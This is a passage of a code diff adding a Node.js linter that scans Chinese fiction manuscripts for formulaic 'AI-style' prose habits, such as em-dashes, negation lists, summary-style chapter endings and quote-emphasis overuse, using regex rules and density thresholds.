+const TRAILER_SUMMARY_PATTERN = /这一(?:夜|天|刻|战|年|局|役)[，,]?[^。！？!?，,\n]{0,6}(?<!命中)(?<!是)注定[^。！？!?\n]{0,8}[。！]|就这样[，,][^。！？!?，,\n]{0,8}(?:一切|全部)[^。！？!?，,\n]{0,4}(?:结束了|落幕|收场)[。！]|这一切[，,]?[^。！？!?，,\n]{0,6}(?:都)?(?:说明|意味着|结束了)(?!的)(?:(?!什么)[^。！？!?\n]){0,6}[。！]|(?:新的篇章|新的旅程|崭新的篇章|新的人生)[^。！？!?\n]{0,6}(?:开始|拉开|展开)|命运[^。！？!?\n]{0,6}齿轮/g;
+
+// 引号强调滥用（实战漏网 E，advisory 密度型，风格照 metaphor-density-tic）：
+// 叙述里短词加引号强调（他是被请来"把关"的）。只数叙述层 1-4 字成对引号片段；
+// 排除项：【】系统面板载体、引语动词（说|道|问|喊|答|念|叫|回|吼|嘀咕，加细 骂|写|读|唱）
+// 前 6 字/后 3 字邻接的极短台词、引号内含句读的台词、引号外无叙述的行（独立台词/
+// 弹幕流/拟声词连发）、引号套引号（台词内强调）。全文 ≥3 处报一条——单处强调是
+// 正常修辞，密度高才是模板腔。
+// 校准：demo 前 20 章 0 章过阈值；《万疆》20 章 2 章过阈值（海报标语“我在番城”系列、
+// “邀战书”等转述载体，真人也这么写），所以该规则只做 advisory，不升 blocking。
+const QUOTE_EMPHASIS_MIN_HITS = 3;
+const QUOTE_EMPHASIS_MAX_VISIBLE = 4;
+const QUOTE_EMPHASIS_SPEECH_VERB_PATTERN = /[说道问喊答念叫回吼骂写读唱嘀咕]/;
+
+const options = {
+  json: false,
+  files: [],
+  failOn: 'all',
+};
+
+for (let i = 2; i < process.argv.length; i += 1) {
+  const arg = process.argv[i];
+  if (arg === '--check') {
+    // Accepted for symmetry with normalize-punctuation.js; detection is always check-only.
+  } else if (arg === '--json') {
+    options.json = true;
+  } else if (arg.startsWith('--fail-on=')) {
+    const v = arg.slice('--fail-on='.length);
+    if (v !== 'blocking' && v !== 'all') die(`--fail-on must be 'blocking' or 'all'`);
+    options.failOn = v;
+  } else if (arg === '-h' || arg === '--help') {
+    process.stdout.write(`${USAGE}\n`);
+    process.exit(0);
+  } else if (arg.startsWith('-')) {
+    die(`Unknown option: ${arg}`);
+  } else {
+    options.files.push(arg);
+  }
+}
+
+if (options.files.length === 0) {
+  die('No files provided');
+}
+
+let failed = false;
+const allFindings = [];
+
+for (const file of options.files) {
+  const fullPath = path.resolve(file);
+  let input;
+  try {
+    input = fs.readFileSync(fullPath, 'utf8');
+  } catch (error) {
+    failed = true;
+    if (!options.json) console.error(`${file}: unable to read (${error.message})`);
+    continue;
+  }
+
+  let whitelist;
+  try { whitelist = loadStyleWhitelist(fullPath); }
+  catch (error) { die(`${file}: unable to read .deslop-whitelist (${error.message})`); }
+  const findings = scanDocument(maskStyleText(input, whitelist)).map((finding) => ({ file, ...finding }));
+  allFindings.push(...findings);
+}
+
+if (options.json) {
+  process.stdout.write(`${JSON.stringify({ findings: allFindings }, null, 2)}\n`);
+} else {
+  for (const finding of allFindings) {
+    console.log(`${finding.file}:${finding.line}:${finding.column}: [${finding.severity}] ${finding.type}: ${finding.message} (${finding.excerpt})`);
+  }
+}
+
+if (failed) process.exit(2);
+// --fail-on=blocking 只在出现 blocking finding 时退出 1（advisory 仅报告）；默认 all 沿用「有任何 finding 即 1」。
+const hasBlocking = allFindings.some((f) => f.severity === 'blocking');
+if (options.failOn === 'blocking' ? hasBlocking : allFindings.length > 0) process.exit(1);
+
+function escapeRegExp(text) {
+  return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+function escapeRegExpCharClass(text) {
+  return text.replace(/[\\\]^-]/g, '\\$&');
+}
+
+function die(message) {
+  console.error(message);
+  console.error(USAGE.trimEnd());
+  process.exit(2);
+}
+
+function scanDocument(input) {
+  const lines = input.split(/\r?\n/);
+  const findings = [];
+  let fence = null;
+  let inFrontMatter = hasYamlFrontMatter(lines);
+  let block = [];
+  const proseLines = [];
+
+  const flushBlock = () => {
+    if (block.length === 0) return;
+    findings.push(...scanBlock(block));
+    block = [];
+  };
+
+  for (let index = 0; index < lines.length; index += 1) {
+    const line = lines[index];
+    const trimmed = line.trim();
+
+    if (inFrontMatter) {
+      if (index > 0 && trimmed === '---') inFrontMatter = false;
+      continue;
+    }
+
+    const fenceMarker = parseFenceMarker(trimmed);
+    if (fence) {
+      if (fenceMarker && fenceMarker.char === fence.char && fenceMarker.length >= fence.length) {
+        fence = null;
+      }
+      continue;
+    }
+
+    if (fenceMarker) {
+      flushBlock();
+      fence = fenceMarker;
+      continue;
+    }
+
+    block.push({ text: line, lineNo: index + 1 });
+    proseLines.push({ text: line, lineNo: index + 1 });
+  }
+
+  flushBlock();
+  findings.push(...scanProsePatterns(proseLines));
+  findings.sort((a, b) => a.line - b.line || a.column - b.column);
+  return findings;
+}
+
+// 段落级检测：碎句号（连续短叙述句）、长段落、破折号（按功能改写，非机械替换）。
+function scanProsePatterns(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+
+    const dashPattern = /——|—|--+/g;
+    let dash;
+    while ((dash = dashPattern.exec(text)) !== null) {
+      findings.push({
+        line: lineNo,
+        column: dash.index + 1,
+        type: 'em-dash',
+        severity: 'blocking',
+        message: '破折号按功能改写：打断→动作 beat/短句，拖长音→省略或动作，插入说明→逗号/冒号；勿一律改句号。',
+        excerpt: compact(text.slice(Math.max(0, dash.index - 8), dash.index + dash[0].length + 8)),
+      });
+    }
+
+    if (trimmed.length > LONG_PARAGRAPH_CHARS) {
+      findings.push({
+        line: lineNo,
+        column: 1,
+        type: 'long-paragraph',
+        severity: 'advisory',
+        message: `段落过长（${trimmed.length} 字）：按镜头/新动作/新线索/视线切换断段，别一段到底。`,
+        excerpt: compact(trimmed.slice(0, 40)),
+      });
+    }
+  }
+
+  findings.push(...findVoiceContrast(proseLines));
+  findings.push(...findNegationParade(proseLines));
+  findings.push(...findFormulaicParallelism(proseLines));
+  findings.push(...findReverseNotIs(proseLines));
+  findings.push(...findTrailerEnding(proseLines));
+  findings.push(...findQuoteEmphasisTic(proseLines));
+  findings.push(...findPeriodStutter(proseLines));
+  findings.push(...findMicroActionTic(proseLines));
+  findings.push(...findStockReactionTic(proseLines));
+  findings.push(...findActionListTic(proseLines));
+  findings.push(...findActionSentenceParade(proseLines));
+  findings.push(...findAbstractSummaryTic(proseLines));
+  findings.push(...findClicheDensityTic(proseLines));
+  findings.push(...findMetaphorDensityTic(proseLines));
+  findings.push(...findReasoningChainTic(proseLines));
+  findings.push(...findNoticeFormalityTic(proseLines));
+  findings.push(...findOvercompressedProseTic(proseLines));
+  findings.push(...findLowConnectiveDensityTic(proseLines));
+  return findings;
+}
+
+// 音量反差腔（实战漏网 A）：引号外叙述逐处 blocking，位置与摘录取自原文
+// （maskQuoted 等长占位保偏移；命中片段不含问号占位符，故不会落进占位区）。
+function findVoiceContrast(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const masked = maskQuoted(text);
+    VOICE_CONTRAST_PATTERN.lastIndex = 0;
+    let match;
+    while ((match = VOICE_CONTRAST_PATTERN.exec(masked)) !== null) {
+      findings.push({
+        line: lineNo,
+        column: match.index + 1,
+        type: 'voice-contrast',
+        severity: 'blocking',
+        message: '音量反差腔：「声音不大/不高…却/但…」是 AI 高频反差模板；删掉音量铺垫，直接写声音落进场子的具体效果（谁停了手、哪排安静了）。',
+        excerpt: compact(text.slice(match.index, match.index + match[0].length)),
+      });
+    }
+  }
+
+  return findings;
+}
+
+// 否定排比（实战漏网 B）：同句「没有X，」连排 / 先否定后「只是」收肯定。
+// 可能在同一片文字上重叠命中，按区间去重只报一次。
+function findNegationParade(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const masked = maskQuoted(text);
+
+    const spans = [];
+    for (const pattern of NEGATION_PARADE_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(masked)) !== null) {
+        spans.push([match.index, match.index + match[0].length]);
+      }
+    }
+    spans.sort((a, b) => a[0] - b[0]);
+
+    let lastEnd = -1;
+    for (const [start, end] of spans) {
+      if (start < lastEnd) {
+        lastEnd = Math.max(lastEnd, end);
+        continue;
+      }
+      lastEnd = end;
+      findings.push({
+        line: lineNo,
+        column: start + 1,
+        type: 'negation-parade',
+        severity: 'blocking',
+        message: '否定排比：「没有X，没有Y…」/「没X，没有Y，只是Z」是 AI 高频排比模板；删掉否定清单，直接写现场实际有什么，最多留一个最有信息量的否定。',
+        excerpt: compact(text.slice(start, end)),
+      });
+    }
+  }
+
+  return findings;
+}
+
+function findFormulaicParallelism(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    for (const [pattern, message] of [
+      [DECISION_FRAME_PATTERN, '「至于X不X，怎么X」把同一决定拆成工整栏目；若只是复述细纲，压成角色当下的一次判断或直接动作。'],
+      [REPEATED_NEGATIVE_VERB_PATTERN, '同动词「不V A，不V B」容易写成否定清单；含台词也要按语境复核，保留真正有功能的一项即可。'],
+    ]) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(text)) !== null) {
+        findings.push({
+          line: lineNo,
+          column: match.index + 1,
+          type: 'formulaic-parallelism',
+          severity: 'advisory',
+          message,
+          excerpt: compact(match[0]),
+        });
+      }
+    }
+  }
+
+  // 跨段「不是A / 也不是B / 只是C」既可能是细纲复述，也可能是正常的
+  // 辩解、悬念排除或情绪递进。纯句法无法稳定区分，因此只给 advisory，交给语义复核。
+  const window = [];
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed) continue;
+    if (isDivider(trimmed) || isStructural(trimmed)) {
+      window.length = 0;
+      continue;
+    }
+    if (window.length && lineNo - window[window.length - 1].lineNo > 2) window.length = 0;
+    window.push({ text: maskQuoted(trimmed), original: trimmed, lineNo });
+    if (window.length > 3) window.shift();
+    if (window.length !== 3) continue;
+    if (!CROSS_NEGATION_START.test(window[0].text)
+      || !CROSS_NEGATION_MIDDLE.test(window[1].text)
+      || !CROSS_NEGATION_END.test(window[2].text)) continue;
+    findings.push({
+      line: window[0].lineNo,
+      column: 1,
+      type: 'formulaic-parallelism',
+      severity: 'advisory',
+      message: '跨段「不是… / 也不是… / 只是…」可能是工整否定铺排，也可能承担辩解或悬念排除；通读语境，只在重复细纲或拖慢画面时改写。',
+      excerpt: compact(window.map((entry) => entry.original).join(' / ')),
+    });
+  }
+
+  return findings;
+}
+
+// 反序对比腔（实战漏网 C）：「是A，不是B」。排除基建复用 not-is-comparison：
+// 引号内剥离、「是的/是啊」确认语；前字合成词与反问尾巴见 REVERSE_NOT_IS_PREV_EXCLUDE 注释。
+function findReverseNotIs(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const masked = maskQuoted(text);
+    REVERSE_NOT_IS_PATTERN.lastIndex = 0;
+    let match;
+    while ((match = REVERSE_NOT_IS_PATTERN.exec(masked)) !== null) {
+      const start = match.index;
+      // 「就是/也是/还是/只是/可是…」里的「是」是合成词一部分，不是肯定项系动词。
+      if (REVERSE_NOT_IS_PREV_EXCLUDE.has(masked[start - 1])) continue;
+      // 「是不是…」问句起头。
+      if (masked[start + 1] === '不') continue;
+      // 「是的，…不是…」承接确认语（复用 not-is 的判定）。
+      if (isAffirmationTagAt(masked, start)) continue;
+      // 「…，不是吗/不是么/不是吧」反问尾巴。
+      if (/^[吗么吧]/.test(match[2])) continue;
+      findings.push({
+        line: lineNo,
+        column: start + 1,
+        type: 'reverse-not-is',
+        severity: 'blocking',
+        message: '反序对比腔：「是A，不是B」与「不是A，是B」同族；删掉后置否定，直接写 A 的具体表现，或用细节让读者自己对比。',
+        excerpt: compact(text.slice(start, start + match[0].length)),
+      });
+    }
+  }
+
+  return findings;
+}
+
+// 预告式总结收尾（实战漏网 D）：只扫文末窗口。从文末往回收集叙述行，
+// 直到剥引号后的可见字数达到窗口大小（按行取整，边界行整行计入）。
+function findTrailerEnding(proseLines) {
+  const windowLines = [];
+  let accumulated = 0;
+
+  for (let i = proseLines.length - 1; i >= 0 && accumulated < TRAILER_ENDING_WINDOW_CHARS; i -= 1) {
+    const { text } = proseLines[i];
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    windowLines.unshift(proseLines[i]);
+    accumulated += visibleLength(stripQuoted(trimmed));
+  }
+
+  const findings = [];
+  for (const { text, lineNo } of windowLines) {
+    const masked = maskQuoted(text);
+    TRAILER_ENDING_PATTERN.lastIndex = 0;
+    let match;
+    while ((match = TRAILER_ENDING_PATTERN.exec(masked)) !== null) {
+      findings.push({
+        line: lineNo,
+        column: match.index + 1,
+        type: 'trailer-ending',
+        severity: 'blocking',
+        message: '预告式总结收尾：「没人知道/才刚刚开始/正朝着…压了过去」是 AI 章尾预告腔；结尾停在具体动作、画面或一句台词上，悬念让事件自己挂住，别替读者预告下一章。',
+        excerpt: compact(text.slice(match.index, match.index + match[0].length)),
+      });
+    }
+    TRAILER_SUMMARY_PATTERN.lastIndex = 0;
+    let summaryMatch;
+    while ((summaryMatch = TRAILER_SUMMARY_PATTERN.exec(masked)) !== null) {
+      findings.push({
+        line: lineNo,
+        column: summaryMatch.index + 1,
+        type: 'trailer-summary',
+        severity: 'blocking',
+        message: '章尾状态总结体：「这一夜注定…/这一切都结束了/新的人生才刚刚开始/命运的齿轮」是把细纲的收束状态原样写成了总结句；收束状态是规划口径，正文落到最后一个具体动作、画面或台词上，别替读者盖章。',
+        excerpt: compact(text.slice(summaryMatch.index, summaryMatch.index + summaryMatch[0].length)),
+      });
+    }
+  }
+
+  return findings;
+}
+
+// 引号强调滥用（实战漏网 E）：统计叙述层 1-4 字成对引号强调片段，全文只报一条
+// （密度型分布指纹）。台词类排除见 QUOTE_EMPHASIS_* 常量注释。
+function findQuoteEmphasisTic(proseLines) {
+  let hits = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    // 引号外没有叙述的行（独立台词/弹幕流/拟声词连发「“叮咚~”“叮咚~”」）整行跳过：
+    // 强调滥用是叙述层指纹，没有叙述就无所谓强调。
+    if (visibleLength(stripQuoted(trimmed)) === 0) continue;
+    const ranges = quotedRanges(text);
+
+    for (const [start, end] of ranges) {
+      if (text[start] === '【') continue; // 系统面板/公告载体，不是强调引号
+      // 引号套引号：台词内部的强调属于角色语言，不算叙述层强调滥用。
+      if (ranges.some(([s2, e2]) => s2 <= start && end <= e2 && (s2 !== start || e2 !== end))) continue;
+      const inner = text.slice(start + 1, end - 1);
+      const visible = visibleLength(inner);
+      if (visible < 1 || visible > QUOTE_EMPHASIS_MAX_VISIBLE) continue;
+      if (/[。！？!?…，,；;：:]/.test(inner)) continue; // 含句读的是台词/播报，不是强调
+      const before = text.slice(Math.max(0, start - 6), start);
+      const after = text.slice(end, end + 3);
+      if (QUOTE_EMPHASIS_SPEECH_VERB_PATTERN.test(before) || QUOTE_EMPHASIS_SPEECH_VERB_PATTERN.test(after)) continue; // 引语动词邻接=极短台词
+      hits += 1;
+      if (firstLine === null) firstLine = lineNo;
+      if (samples.length < 6 && !samples.includes(inner)) samples.push(inner);
+    }
+  }
+
+  if (hits < QUOTE_EMPHASIS_MIN_HITS) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'quote-emphasis-tic',
+    severity: 'advisory',
+    message: `引号强调滥用：叙述里 1-4 字短词加引号强调 ${hits} 处；只留真正反讽/转述必要的一两处，其余去掉引号直接写，或换成具体动作让读者自己品。`,
+    excerpt: compact(samples.join(' ')),
+  }];
+}
+
+// 微动作复读：统计引号外叙述里「了X量词」轻量补语的密度。次数与每千字密度双门槛，
+// 全文只报一条（这是分布级指纹，不是逐处问题）。
+function findMicroActionTic(proseLines) {
+  let hits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+    MICRO_TIC_PATTERN.lastIndex = 0;
+    let match;
+    while ((match = MICRO_TIC_PATTERN.exec(narrative)) !== null) {
+      hits += 1;
+      if (firstLine === null) firstLine = lineNo;
+      if (samples.length < 6 && !samples.includes(match[0])) samples.push(match[0]);
+    }
+  }
+
+  if (narrativeChars === 0 || hits < MICRO_TIC_MIN_HITS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < MICRO_TIC_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'micro-action-tic',
+    severity: 'advisory',
+    message: `微动作复读：「了下/了一下」式轻量补语 ${hits} 处（${perKilo.toFixed(1)}/千字）；同一反应模板高密度复现是机械指纹，合并动作 beat、换具体细节，别每个动作都补一个轻反应尾巴。`,
+    excerpt: compact(samples.join(' ')),
+  }];
+}
+
+// 套式反应细节：统计引号外叙述中通用的部位/声线反应与固定语气比喻。
+// 这是删除测试的候选集，不是身体描写黑名单；全篇只报一条，保留有动作后果、
+// 伤势、人物习惯或情节功能的细节。
+function findStockReactionTic(proseLines) {
+  let hits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+
+    for (const pattern of STOCK_REACTION_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(narrative)) !== null) {
+        hits += 1;
+        if (firstLine === null) firstLine = lineNo;
+        const sample = sentenceAround(narrative, match.index);
+        if (samples.length < 6 && sample && !samples.includes(sample)) samples.push(sample);
+      }
+    }
+  }
+
+  if (narrativeChars === 0 || hits < STOCK_REACTION_MIN_HITS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < STOCK_REACTION_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'stock-reaction-tic',
+    severity: 'advisory',
+    message: `套式反应细节：指尖/指节/喉结/眼圈/声音放轻等通用反应或“平静得像在念”式语气比喻 ${hits} 处（${perKilo.toFixed(1)}/千字）；逐处做删除测试，只标注情绪、不改变选择、关系、物件或动作结果的删掉，不要换部位或同义动作。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+function findActionListTic(proseLines) {
+  const findings = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed).trim();
+    if (!narrative) continue;
+
+    ACTION_LIST_VERB_PATTERN.lastIndex = 0;
+    const verbs = [];
+    let match;
+    while ((match = ACTION_LIST_VERB_PATTERN.exec(narrative)) !== null) {
+      verbs.push(match[0]);
+    }
+
+    if (verbs.length < ACTION_LIST_MIN_HITS) continue;
+    const separators = (narrative.match(/[，、；;]/g) || []).length;
+    if (separators < ACTION_LIST_MIN_SEPARATORS) continue;
+
+    findings.push({
+      line: lineNo,
+      column: 1,
+      type: 'action-list-tic',
+      severity: 'advisory',
+      message: `监控摄像头式动作清单：同段连续动作动词 ${verbs.length} 个、分隔符 ${separators} 个；合并琐碎步骤，只保留有情绪/情节功能的动作，必要时用角色犹豫、误判或环境反馈做缓冲。`,
+      excerpt: compact(verbs.slice(0, 8).join(' ')),
+    });
+  }
+
+  return findings;
+}
+
+// 动作句流水账：全文级判据，抓"句句都是谁做了什么"的监控摄像头写法。
+// 判据见文件头部 PARADE_* 常量注释。
+function findActionSentenceParade(proseLines) {
+  const narrative = [];
+  let firstLine = null;
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const n = stripQuoted(trimmed).trim();
+    if (!n) continue;
+    narrative.push(n);
+    if (firstLine === null) firstLine = lineNo;
+  }
+  if (narrative.length === 0) return [];
+
+  const sentences = narrative.join('').split(/[。！？!?；;]/).map(s => s.trim()).filter(s => s.length > 0);
+  if (sentences.length < PARADE_MIN_SENTENCES) return [];
+
+  let actionSentences = 0;
+  const samples = [];
+  for (const s of sentences) {
+    if (s.length < 2 || s.length > 30) continue;
+    if (!PARADE_SUBJECT_PATTERN.test(s)) continue;
+    if (PARADE_MIND_TAIL.test(s)) continue;
+    PARADE_ACTION_PATTERN.lastIndex = 0;
+    if (!PARADE_ACTION_PATTERN.test(s)) continue;
+    actionSentences++;
+    if (samples.length < 10) samples.push(s);
+  }
+
+  const ratio = actionSentences / sentences.length;
+  if (actionSentences < PARADE_MIN_ACTION || ratio < PARADE_MIN_RATIO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'action-sentence-parade',
+    severity: 'advisory',
+    message: `动作句流水账：${actionSentences}/${sentences.length} 句（${(ratio * 100).toFixed(0)}%）是“人物+动作”短句，叙述主干被动作挤满、缺叙述/心理/环境句间隔。步骤能合并的合并，能用叙述直接讲的别演；动作只留改变判断、关系或下一动作的。打斗/追逐等功能性场面可保留。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+// 套词密度：统计引号外叙述中的高危禁用词聚集。不是逐词替换器；只在密度高到
+// 形成模板腔时提示，修法是删总结、换具体动作/物件/对话，不是同义词轮换。
+function findClicheDensityTic(proseLines) {
+  let hits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+
+    for (const pattern of CLICHE_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(narrative)) !== null) {
+        hits += 1;
+        if (firstLine === null) firstLine = lineNo;
+        if (samples.length < 8 && !samples.includes(match[0])) samples.push(match[0]);
+      }
+    }
+  }
+
+  if (narrativeChars === 0 || hits < CLICHE_DENSITY_MIN_HITS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < CLICHE_DENSITY_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'cliche-density-tic',
+    severity: 'advisory',
+    message: `套词密度过高：高危 AI 套词 ${hits} 处（${perKilo.toFixed(1)}/千字）；不要同义词轮换，改成角色当下可见的动作、物件、对话和具体后果。`,
+    excerpt: compact(samples.join(' ')),
+  }];
+}
+
+// 比喻密度：统计引号外叙述中“像/好像/仿佛/如同”等比喻标记。
+// 单个比喻不是问题；高密度成片时才提示，避免把文本改成另一种修辞模板。
+function findMetaphorDensityTic(proseLines) {
+  let hits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+
+    METAPHOR_MARKER_PATTERN.lastIndex = 0;
+    let match;
+    while ((match = METAPHOR_MARKER_PATTERN.exec(narrative)) !== null) {
+      hits += 1;
+      if (firstLine === null) firstLine = lineNo;
+      const sample = sentenceAround(narrative, match.index);
+      if (samples.length < 6 && sample && !samples.includes(sample)) samples.push(sample);
+    }
+
+    METAPHOR_LIKE_PHRASE_PATTERN.lastIndex = 0;
+    while ((match = METAPHOR_LIKE_PHRASE_PATTERN.exec(narrative)) !== null) {
+      const prefix = narrative.slice(Math.max(0, match.index - 8), match.index);
+      if (/好像|像是|像|仿佛|宛如|如同|犹如/.test(prefix)) continue;
+      hits += 1;
+      if (firstLine === null) firstLine = lineNo;
+      const sample = sentenceAround(narrative, match.index);
+      if (samples.length < 6 && sample && !samples.includes(sample)) samples.push(sample);
+    }
+  }
+
+  if (narrativeChars === 0 || hits < METAPHOR_DENSITY_MIN_HITS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < METAPHOR_DENSITY_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'metaphor-density-tic',
+    severity: 'advisory',
+    message: `比喻密度过高：像/好像/仿佛/如同等比喻标记 ${hits} 处（${perKilo.toFixed(1)}/千字）；保留最有叙事功能的少数比喻，其余回到具体动作、物件、声音或后果，不要换成新比喻。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+// 解释链密度：统计引号外叙述中“知道/明白/这意味着/必须需要”等判断链。
+// 全篇只报一条；修法不是补结构虚词，而是把判断落到动作、物件、对话和现场反馈。
+function findReasoningChainTic(proseLines) {
+  let hits = 0;
+  let coreHits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+  const buckets = new Set();
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+
+    for (const { pattern, key, core } of REASONING_CHAIN_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(narrative)) !== null) {
+        hits += 1;
+        if (core) coreHits += 1;
+        buckets.add(key);
+        if (firstLine === null) firstLine = lineNo;
+        const sample = compact(match[0]);
+        if (samples.length < 8 && !samples.includes(sample)) samples.push(sample);
+      }
+    }
+  }
+
+  if (narrativeChars === 0 || hits < REASONING_CHAIN_MIN_HITS) return [];
+  if (coreHits < REASONING_CHAIN_CORE_MIN_HITS || buckets.size < REASONING_CHAIN_MIN_BUCKETS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < REASONING_CHAIN_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'reasoning-chain-tic',
+    severity: 'advisory',
+    message: `解释链密度过高：知道/明白/这意味着/必须/需要等判断链 ${hits} 处（${perKilo.toFixed(1)}/千字）；像逻辑报告时，把判断落到角色当下可见的动作、物件、对话和现场反馈。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+// 系统/规则行如果连续像 API 文档或政府公文，读者容易闻到机器味。
+// 修法不是删除规则，而是保留功能后把一部分硬词改成白话或具体后果。
+function findNoticeFormalityTic(proseLines) {
+  let hits = 0;
+  let noticeChars = 0;
+  let noticeLines = 0;
+  let coreHits = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!/^【[^】]+】$/.test(trimmed)) continue;
+    noticeLines += 1;
+    noticeChars += visibleLength(trimmed);
+
+    NOTICE_FORMAL_CORE_PATTERN.lastIndex = 0;
+    while (NOTICE_FORMAL_CORE_PATTERN.exec(trimmed) !== null) coreHits += 1;
+
+    for (const pattern of NOTICE_FORMAL_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(trimmed)) !== null) {
+        hits += 1;
+        if (firstLine === null) firstLine = lineNo;
+        const sample = compact(match[0]);
+        if (samples.length < 8 && !samples.includes(sample)) samples.push(sample);
+      }
+    }
+  }
+
+  if (noticeLines < NOTICE_FORMAL_MIN_LINES || noticeChars === 0 || hits < NOTICE_FORMAL_MIN_HITS || coreHits < NOTICE_FORMAL_CORE_MIN_HITS) return [];
+  const perKilo = (hits / noticeChars) * 1000;
+  if (perKilo < NOTICE_FORMAL_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'system-notice-formality-tic',
+    severity: 'advisory',
+    message: `系统公告公文腔过密：方括号规则行中硬规则词 ${hits} 处（${perKilo.toFixed(1)}/千字）；保留为角色看见的屏幕/公告/规则载体，只在载体内部白话化部分硬词，或补角色当场看懂的具体后果，不改成叙述者解释。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+// 长文本整体过于“精炼”：短段很多、自然连接偏少，读起来像处理过的梗概/分镜表。
+// 修法是通读后补断裂处，不是为凑阈值全局加“的/了/就”。
+function findOvercompressedProseTic(proseLines) {
+  let narrativeChars = 0;
+  let narrativeParas = 0;
+  let shortParas = 0;
+  let particles = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed) || /^【[^】]+】$/.test(trimmed)) continue;
+    const narrative = stripQuoted(trimmed).trim();
+    const len = visibleLength(narrative);
+    if (len === 0) continue;
+
+    if (firstLine === null) firstLine = lineNo;
+    narrativeParas += 1;
+    narrativeChars += len;
+    if (len <= OVERCOMPRESSED_PROSE_SHORT_MAX_CHARS) {
+      shortParas += 1;
+      if (samples.length < 6) samples.push(narrative);
+    }
+
+    OVERCOMPRESSED_PROSE_PARTICLE_PATTERN.lastIndex = 0;
+    while (OVERCOMPRESSED_PROSE_PARTICLE_PATTERN.exec(narrative) !== null) particles += 1;
+  }
+
